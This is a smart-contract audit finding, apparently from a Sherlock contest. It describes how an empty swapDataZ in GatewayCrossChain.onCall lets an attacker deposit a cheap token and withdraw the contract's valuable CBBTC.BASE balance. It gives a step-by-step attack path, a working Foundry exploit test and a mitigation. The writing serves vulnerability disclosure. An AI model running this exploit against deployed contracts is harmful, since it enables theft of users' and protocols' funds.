# Empty `swapDataZ` Allows `targetZRC20` Drain Using Deposited `zrc20` Amount in `GatewayCrossChain.onCall`

### Summary

If [`GatewayCrossChain.onCall`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L442-L447) is called with `decoded.swapDataZ` being empty, and `decoded.targetZRC20` is different from the deposited `zrc20`, the intended DODO swap is bypassed. The function `_doMixSwap` returns the original `amount` of `zrc20`, which `onCall` then incorrectly uses as the amount for withdrawal operations involving `decoded.targetZRC20` from `GatewayCrossChain`'s own balance. An attacker can deposit a small amount of a low-value token and receive an equivalent amount of a different, much more valuable token held by `GatewayCrossChain`, which is then sent to the attacker's destination on another EVM chain.

### Root Cause

The bug exists in how `GatewayCrossChain.onCall` handles the DODO swap logic when `decoded.swapDataZ` is empty.

1.  **Cross-chain Message & Payload Decoding:** `GatewayCrossChain.onCall` receives `amount` of `zrc20` tokens and a `message`. The payload is decoded into `DecodedMessage memory decoded` and `MixSwapParams memory params`.
    If `decoded.swapDataZ` (part of the user-controlled payload) is empty, `params` will be initialized with default/zeroed values.

    ```solidity
    function onCall(
        MessageContext calldata context,
        address zrc20, // e.g DAI.ETH
        uint256 amount, // e.g. 1e8 wei of DAI.ETH
        bytes calldata message 
    ) external onlyGateway {
        // ...
        bytes calldata _message = message[32:]; 
        (DecodedMessage memory decoded, MixSwapParams memory params) = 
            SwapDataHelperLib.decodeMessage(_message); 
        // If decoded.swapDataZ is empty, params is zeroed. decoded.targetZRC20 can be CBBTC.BASE 
        // ...
        uint256 platformFeesForTx = _handleFeeTransfer(zrc20, amount);
        uint256 amountAfterFee = amount - platformFeesForTx; 
        // ...
        // If decoded.swapDataZ is empty:
        uint256 outputAmount = _doMixSwap(decoded.swapDataZ, amountAfterFee, params); // Returns amountAfterFee

        // Proceeds to withdrawal logic using outputAmount and decoded.targetZRC20
        if (decoded.dstChainId == BITCOIN_EDDY) {
            // ... 
        } else { // EVM or Solana path taken
            // ... _handleEvmOrSolanaWithdraw(..., decoded, outputAmount, decoded.receiver);
        }
    }
    ```

2.  **`_doMixSwap` with Empty `swapDataZ`:** The `_doMixSwap` function is called. If `swapData` (which is `decoded.swapDataZ`) is empty, it bypasses the DODO swap.

    ```solidity
    function _doMixSwap(
        bytes memory swapData, // EMPTY decoded.swapDataZ in this scenario
        uint256 amount,        // Amount of DAI.ETH (amountAfterFee)
        MixSwapParams memory params // Zeroed params
    ) internal returns (uint256 outputAmount) {
        if (swapData.length == 0) { // TRUE for this attack
            return amount; // Returns amount of DAI.ETH
        }
        // DODO swap logic (approvals, mixSwap call) is SKIPPED
        // ...
    }
    ```
    `_doMixSwap` returns `amount`.

3.  **Incorrect Token Withdrawal via `_handleEvmOrSolanaWithdraw`:** Back in `onCall`, `outputAmount` is now equal to `amountAfterFee`. The EVM/Solana path is taken. `_handleEvmOrSolanaWithdraw` is called with `decoded.targetZRC20 = CBBTC.BASE` (from attacker payload) and `outputAmount = 1e8`.

    ```solidity
    function _handleEvmOrSolanaWithdraw(
        bytes32 externalId,
        DecodedMessage memory decoded, // decoded.targetZRC20 is CBBTC.BASE
        uint256 outputAmount,         // is 1e8 (from DAI.ETH amount)
        bytes memory receiver
    ) internal returns (uint256 amountsOutTarget) {
        (address gasZRC20, uint256 gasFee) = IZRC20(decoded.targetZRC20).withdrawGasFeeWithGasLimit(gasLimit);
        
        // Assuming gasZRC20 is CBBTC.BASE if targetZRC20 is CBBTC.BASE

        if (decoded.targetZRC20 == gasZRC20) { // TRUE if targetZRC20 is CBBTC.BASE
            if (gasFee >= outputAmount) revert NotEnoughToPayGasFee();
            // @audit Approves contract's OWN CBBTC.BASE for (1e8 [DAI amount] + gasFee)
            IZRC20(decoded.targetZRC20).approve(address(gateway), outputAmount + gasFee); 

            bytes memory data = SwapDataHelperLib.buildOutputMessage(
                externalId, outputAmount - gasFee, decoded.receiver, decoded.swapDataB
            );
            // ... encoding for Solana if needed ...
            // @audit Withdraws (1e8 [DAI amount] - gasFee) of contract's OWN CBBTC.BASE
            withdrawAndCall( 
                externalId, decoded.contractAddress, decoded.targetZRC20, outputAmount - gasFee, receiver, encoded_data
            );
            amountsOutTarget = outputAmount - gasFee;
        } else {
            // Path for when targetZRC20 needs to be swapped for gas token - less direct for this specific attack variant.
            // ...
        }
    }
    ```
    `GatewayCrossChain` approves and attempts to withdraw its own `CBBTC.BASE` balance, but the `outputAmount` used is based on the amount of the deposited `DAI.ETH`. No actual swap or value conversion for `CBBTC.BASE` has occurred related to its own value vs `DAI.ETH`.

### Internal Pre-conditions

1.  The `GatewayCrossChain` contract must have a non-zero balance of the `decoded.targetZRC20` that the attacker intends to drain. This is plausible due to the refund mechanism.

### External Pre-conditions

1.  ZetaChain's Gateway and the source chain's Gateway must be operational to relay the transaction and payload.

### Attack Path
1.  **Pre-condition:** `GatewayCrossChain` contract holds at least `1e8` of `CBBTC.BASE` ZRC20.
2.  **Attacker's Action:** Attacker initiates a cross-chain transaction via `GatewaySend.depositAndCall` in Ethereum.
    *   Attacker deposits `1e8` wei of `DAI.ETH` ZRC20. This `DAI.ETH` becomes `zrc20` in `onCall`, and `amount` becomes `1e8`.
    *   The `payload` sent to `onCall` is crafted such that when `SwapDataHelperLib.decodeMessage` processes it:
        *   `decoded.dstChainId`: Base Chain ID.
        *   `decoded.targetZRC20`: `address(CBBTC.BASE)`.
        *   `decoded.receiver`: Attacker's address on the destination EVM chain (bytes).
        *   `decoded.swapDataZ`: `""` (empty bytes).
        *   `decoded.contractAddress`: The `GatewaySend` address on Base chain.
        *   `decoded.swapDataB`: (empty or data for destination chain call).
3.  **Execution within `GatewayCrossChain.onCall`:**
    *   `onCall` receives `amount = 1e8` of `zrc20 = DAI.ETH`.
    *   Assume platform fees is zero. `amountAfterFee` remains `1e8`.
    *   `outputAmount = _doMixSwap("", 1e8, params)` is called.
    *   `_doMixSwap` sees `swapDataZ.length == 0` and returns `1e8`. So, `outputAmount = 1e8`.
    *   The `else` block for EVM/Solana withdrawal is taken. `_handleEvmOrSolanaWithdraw` is called with `decoded.targetZRC20 = CBBTC.BASE` and `outputAmount = 1e8`.
    *   Inside `_handleEvmOrSolanaWithdraw`:
        *   Assuming `gasZRC20` is `CBBTC.BASE`. The condition `decoded.targetZRC20 == gasZRC20` is true.
        *   Assume `gasFee` is `0` for simplicity.
        *   `IZRC20(CBBTC.BASE).approve(address(gateway), 1e8 + gasFee);` approves contract's own `CBBTC.BASE`.
        *   `withdrawAndCall` is invoked to send `(1e8 - gasFee)` of the contract's `CBBTC.BASE` to the attacker's destination.
4.  **Result**: `GatewayCrossChain`'s `CBBTC.BASE` balance is reduced by `1e8` wei (1 CBBTC woth ~$105,000). The attacker used `1e8` wei of `DAI` (worth less than $0.1) to achieve this.

### Impact

Direct loss of any ZRC20 tokens held by `GatewayCrossChain`. An attacker can specify a `targetZRC20` they wish to drain, send an amount of a different `zrc20`, provide empty `swapDataZ`, and receive the `targetZRC20` from the contract's balance on a destination chain.

### PoC

Add the following test in `test/GatewayCrossChain.t.sol`:

```solidity
/// @dev This bug allows anyone to drain arbitary targetZRC20 from GatewayCrossChain
/// @custom:command forge test --match-contract GatewayCrossChainTest --match-test test_EmptySwapDataZ --fork-url https://zetachain-mainnet.g.allthatnode.com/archive/evm
function test_EmptySwapDataZ() public {
    address targetContract = address(gatewayCrossChain);
    address attacker = makeAddr("attacker");
    uint256 amount = 1e8;

    // Assets
    ERC20Mock dai = new ERC20Mock("DAI", "DAI", 18);
    ZRC20Mock zrc20DAI = new ZRC20Mock("ZetaChain DAI Ethereum", "DAI.ETH", 18);
    ERC20Mock cbbtc = new ERC20Mock("Coinbase Bitcoin", "CBBTC", 8);
    ZRC20Mock zrc20CBBTC = new ZRC20Mock("ZetaChain CBBTC Base", "CBBTC.BASE", 8);

    // Balances
    dai.mint(attacker, amount); // 0.00xxx DAI
    zrc20DAI.mint(address(gatewayZEVM), amount); // Deposited DAI.ETH on ZetaChain
    zrc20CBBTC.mint(targetContract, amount); // 1 CBBTC.BASE e.g. for refund failed cross-chain tx
    cbbtc.mint(address(gatewayB), amount); // 1 CBBTC escrowed in gateway

    // Approvals
    vm.prank(attacker);
    dai.approve(address(gatewaySendA), amount);

    // Gateways
    gatewayA.setZRC20(address(dai), address(zrc20DAI));
    gatewayB.setZRC20(address(cbbtc), address(zrc20CBBTC));
    zrc20CBBTC.setGasFee(0); // For simplicity
    zrc20CBBTC.setGasZRC20(address(zrc20CBBTC));

    // Payload
    address targetZRC20 = address(zrc20CBBTC); // !!! Bug's trigger
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);
    bytes memory swapDataZ = ""; // !!! Bug's trigger
    bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
    bytes memory fromTokenA = abi.encodePacked(address(cbbtc));
    bytes memory toTokenA = abi.encodePacked(address(cbbtc));
    bytes memory swapDataA = "";
    bytes memory accounts = "";
    bytes memory payload = encodeMessage(
        2,
        targetZRC20,
        sender,
        receiver,
        swapDataZ,
        contractAddress,
        abi.encodePacked(fromTokenA, toTokenA, swapDataA),
        accounts
    );

    vm.prank(attacker);
    gatewaySendA.depositAndCall(targetContract, amount, address(dai), 2, payload);

    // Attacker successfully drain 1 CBBTC (~$100,000) with less than 1 DAI (~$0.0001) via empty swap data
    assertEq(dai.balanceOf(attacker), 0);
    assertEq(cbbtc.balanceOf(attacker), amount);
}
```

### Mitigation
In `GatewayCrossChain.onCall`, if `decoded.swapDataZ` is empty, the contract must ensure that `decoded.targetZRC20` is the same as `zrc20`.
